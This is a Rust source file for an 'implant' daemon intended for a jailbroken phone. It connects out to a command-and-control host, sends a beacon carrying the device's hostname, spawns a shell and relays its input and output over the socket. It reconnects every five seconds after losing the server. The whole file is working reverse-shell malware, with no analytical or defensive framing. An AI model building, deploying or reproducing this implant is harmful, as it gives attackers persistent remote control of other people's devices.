/* Documntation:
implant runs on the jailbroken phone as a daemon binary.
connect -> beacon -> pump shell both ways on two threads.
*/

use ravenna::frame;
use ravenna::proto::{Beacon, Envelope, ShellData, ShellExit, ShellStart, envelope};
use ravenna::shell;
use ravenna::socket::{Sock, SockRole};
use std::sync::Arc;

fn _implant_id() -> String {
    let mut _buf = [0u8; 64];
    unsafe {
        libc::gethostname(
            _buf.as_mut_ptr() as *mut libc::c_char,
            _buf.len() as libc::size_t,
        );
    }
    let _s = String::from_utf8_lossy(&_buf);
    let _t = _s.trim_matches(char::from(0)).trim().to_string();
    if _t.is_empty() {
        "implant0".to_string()
    } else {
        _t
    }
}

fn _pump(_sock: Sock) {
    let _sock = Arc::new(_sock);
    let _id = _implant_id();

    frame::send_msg(
        &_sock,
        &Envelope {
            m: Some(envelope::M::B(Beacon {
                implant_id: _id.clone(),
            })),
        },
    );
    frame::send_msg(
        &_sock,
        &Envelope {
            m: Some(envelope::M::S(ShellStart { implant_id: _id })),
        },
    );

    let _sh = shell::spawn_shell();

    // shell -> socket blocks on shell_read
    let _s1 = _sock.clone();
    let _out_fd = _sh.stdout_fd;
    let _pid = _sh.pid;
    let _t1 = std::thread::spawn(move || {
        loop {
            let mut _out = [0u8; 4096];
            let _n = shell::shell_read(_out_fd, &mut _out);
            if _n <= 0 {
                let mut _st = 0 as libc::c_int;
                let _r = unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) };
                if _r == _pid {
                    frame::send_msg(
                        &_s1,
                        &Envelope {
                            m: Some(envelope::M::E(ShellExit { code: _st })),
                        },
                    );
                }
                break;
            }
            frame::send_msg(
                &_s1,
                &Envelope {
                    m: Some(envelope::M::D(ShellData {
                        chunk: _out[.._n as usize].to_vec(),
                    })),
                },
            );
        }
    });

    // socket -> shell blocks on recv_msg
    let _s2 = _sock.clone();
    let _in_fd = _sh.stdin_fd;
    let _t2 = std::thread::spawn(move || {
        loop {
            match frame::recv_msg(&_s2) {
                Some(_env) => {
                    if let Some(envelope::M::D(_d)) = _env.m {
                        shell::shell_write(_in_fd, &_d.chunk);
                    }
                }
                None => break,
            }
        }
    });

    let _ = _t1.join();
    // shell died, close socket so the other thread unblocks
    unsafe {
        libc::shutdown(_sock.fd(), libc::SHUT_RDWR);
        libc::close(_sh.stdin_fd);
        libc::close(_sh.stdout_fd);
    }
    let _ = _t2.join();
}

fn main() {
    let _args: Vec<String> = std::env::args().collect();
    let _host = _args.get(1).cloned().unwrap_or("127.0.0.1".to_string());
    let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);

    loop {
        eprintln!("implant trying {_host}:{_port} ...");
        let _s: Sock = Sock::new(SockRole::Client {
            host: _host.clone(),
            port: _port,
        });
        _pump(_s);
        eprintln!("lost server, sleeping 5s ...");
        unsafe {
            libc::sleep(5);
        }
    }
}
